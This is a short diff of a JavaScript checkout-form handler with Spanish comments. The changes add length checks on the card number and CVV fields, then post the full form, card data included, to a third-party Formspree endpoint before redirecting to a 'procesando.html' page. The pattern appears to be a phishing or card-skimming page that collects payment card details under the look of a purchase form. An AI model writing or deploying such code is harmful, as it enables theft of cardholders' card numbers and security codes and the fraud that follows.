@@ -2,11 +2,11 @@
   const form = document.getElementById("formulario-compra");
 
   form.addEventListener("submit", async (e) => {
-    e.preventDefault(); // Evita el envío tradicional
+    e.preventDefault();
 
     let valido = true;
 
-    // Validar campos
+    // Validación personalizada
     form.querySelectorAll("input[required]").forEach(input => {
       if (!input.value.trim()) {
         input.classList.add("error");
@@ -16,14 +16,26 @@
       }
     });
 
-    if (!valido) {
-      alert("Por favor, completa todos los campos.");
-      return;
+    // Validar campos específicos de tarjeta
+    const tarjeta = document.getElementById("tarjeta").value.trim();
+    const cvv = document.getElementById("cvv").value.trim();
+
+    if (tarjeta.length < 13 || tarjeta.length > 19) {
+      alert("El número de tarjeta debe tener entre 13 y 19 dígitos.");
+      valido = false;
     }
 
+    if (cvv.length < 3 || cvv.length > 4) {
+      alert("El CVV debe tener 3 o 4 dígitos.");
+      valido = false;
+    }
+
+    if (!valido) return;
+
     try {
-      // Enviar datos a Formspree
       const formData = new FormData(form);
+
+      // Enviar a Formspree
       const response = await fetch("https://formspree.io/f/mnnbkeaj", {
         method: "POST",
         body: formData,
@@ -31,7 +43,7 @@
       });
 
       if (response.ok) {
-        // Redirigir a tu página
+        // Redirige a tu página procesando.html
         window.location.href = "procesando.html";
       } else {
         alert("Error al enviar el formulario. Intenta nuevamente.");
@@ -41,4 +53,3 @@
     }
   });
 });
-
